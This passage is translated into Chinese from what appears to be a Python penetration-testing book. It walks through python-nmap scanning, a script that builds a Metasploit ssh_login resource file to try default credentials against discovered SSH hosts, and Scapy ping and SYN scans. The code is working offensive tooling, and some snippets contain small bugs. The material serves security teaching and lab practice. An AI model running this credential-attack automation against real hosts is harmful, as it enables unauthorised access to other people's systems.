完整的脚本代码可在[中找到 https://raw.githubusercontent.com/funkandwagnalls/pythonpentest/master/ifacesdetails.py](https://raw.githubusercontent.com/funkandwagnalls/pythonpentest/master/ifacesdetails.py) 。

以下屏幕截图突出显示了此脚本的执行情况：

![Determining your interface details with the netifaces library](../Images/image00290.jpeg)

现在，我们知道这与扫描和识别目标没有直接关系，而是用于消除目标。这些目标是你的系统；一旦开始自动评估某些系统，您将看到您不希望自己的系统出现在列表中。我们将重点介绍如何使用 nmap 库扫描系统，识别目标服务，然后消除任何可能是我们系统的 IP 地址。

# Python 的 Nmap 库

Python 有一些库，允许直接执行`nmap`扫描，可以通过交互式解释器，也可以通过构建多方面的攻击工具。在本例中，让我们使用`nmap`库扫描本地 Kali 实例，寻找**安全 Shell**（**SSH**服务端口。通过执行`/etc/init.d/ssh start`命令，确保服务已启动。然后用`pip install python-nmap`安装 Python`nmap`库。

您现在可以通过直接使用库、导入库并将`nmap.PortScanner()`赋值给变量来执行扫描。然后可以使用该实例化变量执行扫描。让我们在交互式解释器中执行一个示例扫描。以下是使用交互式 Python 解释器对本地 Kali 实例扫描`port 22`的示例：

![Nmap libraries for Python](../Images/image00291.jpeg)

正如你所见，这是一本字典，每一本字典都可以根据需要调用。通过交互式解释器执行扫描需要花费更多的精力，但在您可能已经在有 Python 的环境中站稳脚跟的环境中，它非常有用，并且它将允许您在参与过程中安装库。这样做的更大原因是编写方法脚本，使目标攻击更容易。

为了突出显示这一点，我们可以创建一个脚本，该脚本接受 CLI 参数以扫描特定的主机和端口。因为我们接受 CLI 的参数，所以需要导入 sys 库，因为我们正在扫描`nmap`库，所以需要导入`nmap`。请记住在导入非 Python 本机库时使用条件处理程序；它使工具的可维护性变得简单，而且更加专业：

```
import sys
try:
    import nmap
except:
    sys.exit("[!] Install the nmap library: pip install python-nmap")
```

导入库后，脚本可以设计参数要求。我们至少需要两个论点。这意味着，如果参数少于两个或多于两个，脚本将失败并显示一条帮助消息。请记住，脚本名称作为第一个参数计算，因此我们必须将其递增到`3`。所需参数的结果生成以下代码：

```
# Argument Validator
if len(sys.argv) != 3:
    sys.exit("Please provide two arguments the first being the targets the second the ports")
ports = str(sys.argv[2])
addrs = str(sys.argv[1])
```

现在，如果我们在没有任何参数的情况下运行`nmap_scanner.py`脚本，我们应该会得到一条错误消息，如下面的屏幕截图所示：

![Nmap libraries for Python](../Images/image00292.jpeg)

这是脚本的基本 shell，您可以在其中构建实际的扫描仪。这是一个非常小的组件，相当于实例化类，然后将地址和端口传递给它，然后打印出来：

```
scanner = nmap.PortScanner()
scanner.scan(addrs, ports)
for host in scanner.all_hosts():
    if not scanner[host].hostname():
        print("The host's IP address is %s and it's hostname was not found") % (host)
    else:
        print("The host's IP address is %s and it's hostname is %s") % (host, scanner[host].hostname())
```

这个非常小的脚本为您提供了快速执行必要扫描的方法，如下面的屏幕截图所示。这个测试显示了系统的虚拟接口，我已经用本地主机标识符和接口 IP 地址对其进行了测试。当您使用 localhost 标识符进行扫描时，有两件事需要注意：您将收到一个主机名。如果扫描系统的 IP 地址而不查询名称服务，则将无法识别主机名。以下屏幕截图显示了此脚本的输出：

![Nmap libraries for Python](../Images/image00293.jpeg)

### 注

此脚本可在[找到 https://raw.githubusercontent.com/funkandwagnalls/pythonpentest/master/nmap_scannner.py](https://raw.githubusercontent.com/funkandwagnalls/pythonpentest/master/nmap_scannner.py) 。

因此，这里的最大好处是，现在您可以开始在一定程度上自动化系统的开发。这些类型的自动化应该是相对良性的，以便在出现故障时不会对环境的机密性、完整性或可用性造成损害或影响。您可以通过**Metasploit 框架的远程过程调用**（**MSFRPC**来实现，或者通过自动构建您可以执行的资源文件来实现。对于这个例子，让我们简单地构建一个资源文件，它可以执行凭证攻击来检查默认的 Kali 凭证；你确实改变了他们，对吗？

我们需要像在 Metasploit 控制台中执行的命令一样，通过向文件写入行来生成文件。因此，通过执行`search ssh_login`查看 Metasploit 的`ssh_login`模块，然后在控制台加载`msfconsole`后显示选项。确定所需的选项。以下屏幕截图显示了可以和必须设置的项目示例：

![Nmap libraries for Python](../Images/image00294.jpeg)

其中一些项已经设置，但缺少的组件是远程主机的 IP 地址和我们将要测试的凭据。默认端口已设置，但如果脚本设计用于测试不同的端口，则也必须设置此端口。您会注意到凭据不是必填字段，但要执行凭据攻击，您确实需要它们。为了创建这个，我们将在 Python 中打开并使用`write`函数创建一个文件。我们还将把缓冲区大小设置为零，这样数据就会自动写入到文件中，这与操作系统默认将数据刷新到文件中不同。

脚本还将创建一个单独的资源文件，其中包含它标识的每个主机的 IP 地址。运行此脚本的另一个好处是，它创建了一个已启用 SSH 的目标列表。将来，您应该尝试构建不是为测试单个服务而设计的脚本，但这是一个很好的示例。我们将在前面的脚本概念的基础上进行构建，但是我们将再次构建函数来模块化它。这将允许您在将来更容易地将其转换为类。首先，我们添加了`ifacedetails.py`脚本的所有函数和导入的库。然后，我们将修改脚本的参数代码，以便它接受更多参数：

```
# Argument Validator
if len(sys.argv) != 5:
    sys.exit("[!] Please provide four arguments the first being the targets the second the ports, the third the username, and the fourth the password")
password = str(sys.argv[4])
username = str(sys.argv[3])
ports = str(sys.argv[2])
hosts = str(sys.argv[1])
```

现在构建一个函数，该函数将接受传递给它的详细信息，从而创建一个资源文件。您将创建包含必要值的字符串变量，这些值将写入`ssh_login.rc`文件。然后，如前所述，使用简单的 open 命令将细节写入文件，并使用相关的`bufsize`或`0`。该文件现在已写入字符串值。流程完成后，文件将关闭。当您查看`set_rhosts`值的字符串值时，请记住。请注意，它指向一个文件，该文件每行包含一个 IP 地址。因此，我们需要生成此文件，然后将其传递给此函数：

```
def resource_file_builder(dir, user, passwd, ips, port_num, hosts_file):
    ssh_login_rc = "%s/ssh_login.rc" % (dir)
    bufsize=0
    set_module = "use auxiliary/scanner/ssh/ssh_login \n"
    set_user = "set username " + username + "\n"
    set_pass = "set password " + password + "\n"
    set_rhosts = "set rhosts file:" + hosts_file + "\n"
    set_rport = "set rport" + ports + "\n"
    execute = "run\n"
    f = open(ssh_login_rc, 'w', bufsize)
    f.write(set_module)
    f.write(set_user)
    f.write(set_pass)
    f.write(set_rhosts)
    f.write(execute)
    f.closed
```

接下来，让我们构建实际的`target_identifier`函数，它将使用提供的端口和 IP 使用 nmap 库扫描目标。首先，它清除`ssh_hosts`文件的内容。然后检查扫描是否成功。如果扫描成功，脚本将为通过扫描识别的每个主机启动`for`查找。对于这些主机中的每一个，它都加载接口字典并遍历键和值对。

键保存接口名称，值是一个嵌入式字典，它保存映射到命名键的接口的每个值的详细信息，如前面的`ifacedetails.py`脚本所示。将`'addr'`键的值与扫描得到的`host`值进行比较。如果两者匹配，则主机属于评估员的框，而不是被评估的组织。发生这种情况时，主机值被设置为`None`，并且目标不会添加到`ssh_hosts`文件中。最后一项检查是验证该端口实际上是一个 SSH 端口，并且该端口已打开。然后将该值写入`ssh_hosts`文件并返回到主函数。脚本没有阻止 localhost IP 地址，因为我们将保留在测试和比较中，如果您希望包含此功能，请修改此模块：

```
def target_identifier(dir,user,passwd,ips,port_num,ifaces):
    bufsize = 0
    ssh_hosts = "%s/ssh_hosts" % (dir)
    scanner = nmap.PortScanner()
    scanner.scan(ips, port_num)
    open(ssh_hosts, 'w').close()
    if scanner.all_hosts():
        e = open(ssh_hosts, 'a', bufsize)
    else:
        sys.exit("[!] No viable targets were found!")
    for host in scanner.all_hosts():
        for k,v in ifaces.iteritems():
            if v['addr'] == host:
                print("[-] Removing %s from target list since it 
                    belongs to your interface!") % (host)
                host = None
        if host != None:
            home_dir="/root"
            ssh_hosts = "%s/ssh_hosts" % (home_dir)
            bufsize=0
            e = open(ssh_hosts, 'a', bufsize)
            if 'ssh' in scanner[host]['tcp'][int(port_num)]['name']:
                if 'open' in scanner[host]['tcp'][int(port_num)]['state']:
                    print("[+] Adding host %s to %s since the service is active on %s") % 
                        (host,ssh_hosts,port_num)
                    hostdata=host + "\n"
                    e.write(hostdata)
    if not scanner.all_hosts():
        e.closed
    if ssh_hosts:
        return ssh_hosts
```

现在，脚本需要在执行之前设置一些默认值。最简单的方法是在参数验证器之后设置它们。查看您的脚本，消除函数之外的重复项（如果有），并将以下代码放在参数验证器之后：

```
home_dir="/root"
gateways = {}
network_ifaces={}
```

脚本的最后一个更改是包含一个测试，以查看它是作为独立脚本执行还是作为导入的模块执行。我们已经在本机上执行了这些脚本，但最好的做法是包含一个简单的检查，以便将脚本转换为类。此检查所做的唯一一件事是查看执行的模块的名称是否为`main`，如果是，则表示它是一个独立脚本。当这种情况发生时，它将`__name__`设置为`'__main__'`，表示独立脚本。

看看下面的代码，它按照需要的顺序执行相关函数。这样做是为了确定要利用的可行主机，然后将详细信息传递给资源文件生成器：

```
if __name__ == '__main__':
    gateways = get_gateways()
    network_ifaces = get_networks(gateways)
    hosts_file = target_identifier(home_dir,username,
      password,hosts,ports,network_ifaces)
    resource_file_builder(home_dir, username, 
      password, hosts, ports, hosts_file)
```

你经常会在互联网上看到调用`main()`函数而不是一堆函数的脚本。这在功能上等同于我们在这里所做的，但是您可以在包含前面详细信息的`if __name__ == '__main__':`之上创建一个`main()`函数，然后按照此处突出显示的方式执行它：

```
if __name__ == '__main__':
    main()
```

通过这些微小的更改，您可以根据扫描结果自动生成资源文件。最后，将脚本名称更改为`ssh_login.py`，然后保存并运行它。当脚本运行时，它会生成配置和执行利用漏洞所需的代码。然后您可以使用`-r`选项运行资源文件，如下面的屏幕截图所示。正如您可能已经注意到的，我做了一个测试运行，其中包括我的接口 IP 地址，以突出显示内置的错误检查，然后对 localhost 执行测试。我验证了资源文件的创建是否正确，然后运行了它。

![Nmap libraries for Python](../Images/image00295.jpeg)

进入控制台后，您可以看到资源文件自己执行了攻击，结果如下。绿色的`+`标志表示卡利盒子上打开了一个外壳。

![Nmap libraries for Python](../Images/image00296.jpeg)

也可以在 Metasploit 中使用后跟文件名的`resource`命令调用资源文件。可以使用以下命令资源`ssh_login.rc`对此攻击执行此操作，这将产生相同的结果。然后，您可以通过使用`session -i <session number>`命令启动与新会话的交互来查看与新会话的交互。

以下屏幕截图显示了 Kali 实例中用户名和主机名的验证：

![Nmap libraries for Python](../Images/image00297.jpeg)

当然，你不想对你的普通攻击箱这样做，但它提供了三个关键物品，需要用脚踩它们。始终更改默认密码；否则，即使在订婚期间，你也可能成为受害者。另外，将您的 Kali 实例主机名更改为防御网络工具无法识别的内容，并在使用之前始终测试您的漏洞利用情况。

### 注

有关 Python nmap 库的更多详细信息，请访问[http://xael.org/norman/python/python-nmap/](http://xael.org/norman/python/python-nmap/) 。

现在，了解了 nmap、nmap 库和 Metasploit 资源文件的自动生成，您就可以开始学习 scapy 了。

### 注

此脚本可在[找到 https://raw.githubusercontent.com/funkandwagnalls/pythonpentest/master/ssh_login.py](https://raw.githubusercontent.com/funkandwagnalls/pythonpentest/master/ssh_login.py) 。

# Python 的 Scapy 库

欢迎使用 Scapy，Python 库，该库设计用于操作、发送和读取数据包。Scapy 是具有大量适用性的工具之一，但使用起来似乎很复杂。在开始之前，我们需要了解一些关于 Scapy 的基本规则，这将使创建脚本变得更加容易。

首先，请参阅前面的章节，了解 TCP 标志以及它们在 Scapy 中的表示方式。您需要查看前面提到的标志及其相关位置才能使用它们。其次，当 Scapy 接收到发送的数据包的响应时，标志由 TCP 报头的第 13 个八位字节内的八进制格式的二进制位表示。因此，您必须阅读基于此信息的响应。

请看下表，该表表示每个标志设置时的二进制位置值：

![The Scapy library for Python](../Images/image00298.jpeg)

因此，当您从 TCP 数据包读取响应并查找特定类型的标志时，您必须进行计算。上表将帮助您简化此过程，但请记住，如果您曾经玩过或使用过`tcpdump`，则传输的材料是相同的。例如，如果您正在查找 SYN 数据包，您将看到第 13 个八位组的值为 2。如果它是 SYN+ACK，则值为 18。只需将标志值加在一起，您就可以得到所需的内容。

要记住的下一件事是，如果您尝试 ping 环回接口或 localhost，数据包将不会被组装。这是因为内核拦截请求并通过系统的 TCP/IP 堆栈在内部处理它。这是人们在使用 Scapy 时经常犯的错误之一，并且经常退出。因此，与其埋头修复数据包，以便它们能够命中您自己的 Kali 实例，不如启动您的 Metasploitable 实例，或者尝试测试您的默认网关。

### 提示

如果您想了解更多关于测试环回接口或本地主机值的信息，可以在[找到解决方案 http://www.secdev.org/projects/scapy/doc/troubleshooting.html](http://www.secdev.org/projects/scapy/doc/troubleshooting.html) 。

因此，我们将重点介绍测试连接，然后使用 Scapy 扫描 web 端口。您必须了解 Scapy 有多种发送和接收数据包的方法，根据您想要提取的数据，可能不需要复杂的方法。首先，看看你想要完成什么。如果你想保持独立于操作系统，你应该使用两种方法：第三层的`sr()`和第二层的`srp()`。接下来，如果该方法在函数名后面有`1`，但在`()`符号之前，例如`sr1()`，则表示它只返回第一个答案。这对于实现大多数结果来说已经足够了，但是如果一个流中有多个数据包需要评估，那么您将希望放弃这些类型的方法。

接下来是`send()`方法，它使用第 2 层的操作系统默认值和第 3 层及以上的一些操作系统功能。最后，还有`sendp()`，它使用一个自定义的第 2 层头。这可以使用`Ether()`方法来表示以太网帧头。这对于使用**虚拟局域网****VLAN**基于理论安全性对网络进行分段的无线网络或位置非常有用。这是因为无线通信在第 2 层运行，VLAN 也在该层中标识。

### 注

基于 VLAN 的**访问控制列表****ACL**被大多数评估人员认为是令人烦恼的原因，而不是安全性。这是因为在大多数网络中，您可以通过操纵第 2 层帧的标头轻松跳过网络段。随着您获得更多经验，您将定期在实时网络上看到此类示例。

因此，导入 Scapy 库，然后设置一个带有要 ping 的目标 IP 地址的变量。创建包含要发送到目标主机的通信详细信息和标志的数据包。然后设置响应变量捕捉`sr1()`函数的结果：

```
#!/usr/bin/env python
try:
    from scapy.all import *
except:
    sys.exit("[!] Install the scapy libraries with: pip install 
      scapy")
ip = "192.168.195.2"
icmp = IP(dst=ip)/ICMP()
resp = sr1(icmp, timout=10)
```

![The Scapy library for Python](../Images/image00299.jpeg)

现在您看到您得到了一个答案，这意味着主机很可能已启动。您可以通过以下测试对其进行验证：

```
if resp == None:
    print("The host is down")
else:
    print("The host is up")
```

测试时，您可以看到 ping 扫描的结果是成功的，如下所示：

![The Scapy library for Python](../Images/image00300.jpeg)

我们成功地 ping 了主机，并通过证明响应变量不是空的来验证它。从这里，我们现在可以检查它是否有打开的 web 端口。为此，我们将执行 SYN 扫描。但是，在执行此操作之前，请了解，当您收到连接尝试的响应时，您将同时收到应答和未应答的数据。因此，最好的办法是将两者分开，多亏了 Scapy 和 Python 语法，这非常容易。您只需将响应传递给两个不同的变量，第一个是答案，第二个是未答案，如下所示：

```
answers,unanswers = sr1(icmp, timout=10)
```

通过这个简单的更改，您现在可以清理数据返回，以便于操作。此外，您只需在`answers`或`unanswers`后添加`.summary()`即可从这些细节中获得摘要。如果您正在迭代从`0`到`1024`的端口列表，您可以通过在列表中按位置将值传递给`answers`变量来查看特定端口的特定结果。因此，如果您想查看端口`80`处扫描的结果以获得答案，可以将该值传递到如下列表：`answers[80]`。这将保存这些应答的已发送和已接收数据包，但这些数据包可以进一步拆分，就像前面的示例一样，如下代码所示：

```
sent, received = answers[80]
```

请记住，此示例仅适用于端口`80`，因为您指定了要从中提取数据的位置。如果您没有将位置值传递给`answers`变量，那么您会将所有发送的数据包放入`sent`变量，将所有接收的数据包放入`received`变量。

现在已经列出了基本知识，您可以开发一个数据包，将其发送到目标，并接收结果。在继续之前，需要介绍的一件事是从头开始构建数据包是多么容易，这涉及到首先构建 IP 报头，然后构建 TCP 报头。接下来，将数据传递给扫描仪，扫描仪将目标标识为活动或不活动。您可以将其配置为没有超时值，但我强烈建议您不要这样做，因为您可能需要永远等待，无法返回。运行以下脚本以识别`192.168.195.1`主机并确定 web 端口是否打开：

```
#!/usr/bin/env python
from scapy.all import *
ip = "192.168.195.1"
dst_port = 80
headers=IP(dst=ip)/TCP(dport=dst_port, flags="S")
answers,unanswers=sr(headers,timeout=10)

```

正如您在下面的屏幕截图中所看到的，系统给出了答案。前面的脚本可以独立运行，也可以使用交互式解释器执行每一行，如下所示：

![The Scapy library for Python](../Images/image00301.jpeg)

现在可以从`answers`变量中提取细节。请记住，这是一个列表，因此您应该增加每个值。发送的第一个数据包将由位置 0 表示，因此该位置之后的每个位置表示在原始数据包之后接收的 IP 数据包：

```
for a in answers:
    print(a[1][1].flags)
```

这就是问题所在，尽管列表中的每个值实际上是另一个列表，其中包含更多数据。在 Python 中，我们称之为矩阵，但不要担心！它很容易导航。首先，请记住我们使用了`sr()`函数，这意味着结果将来自第 3 层及以上。每个嵌入式列表用于上面的协议；在这种情况下，它将是 TCP。我们执行了 SYN 扫描，因此我们正在寻找 SYN+ACK 响应。请参阅上一节以计算您要查找的值。通过参考前面与 TCP 标志相关的部分，您可以看到，您在报头中寻找的值是 18，用于验证 SYN+ACK 响应，这可以通过将`ACK = 16`的位置值和`SYN = 2`的位置值相加来计算。下面的屏幕截图显示了实际结果，显示端口已打开。理解这些概念将允许您在将来的脚本中使用 Scapy。

![The Scapy library for Python](../Images/image00302.jpeg)

你现在已经对 Scapy 有了基本的了解，但别担心！你还没做完呢。Scapy 具有大量的功能，我们仅对此进行了介绍，它不仅为您提供了执行简单扫描的方法，还为您提供了操纵网络流量的方法。许多嵌入式设备和**工控系统**（**ICS**采用独特的通信形式，为其他单元提供命令和控制。在其他时候，您会意识到，当 nmap 被阻止时，您需要识别活动设备。Scapy 可以帮助您完成所有这些任务。

# 总结

在本章中，将介绍有关识别网络上的活动主机、可行目标和不同通信模型的许多详细信息。为了便于您理解协议及其通信方式，我们在数据包和帧级别讨论了它们的不同形式。本章以使用支持目标标识的 Python`nmap`和`Scapy`库自动利用主机而告终。在下一章中，我们将以这些概念为基础，了解如何利用字典、暴力和密码喷射攻击来利用服务。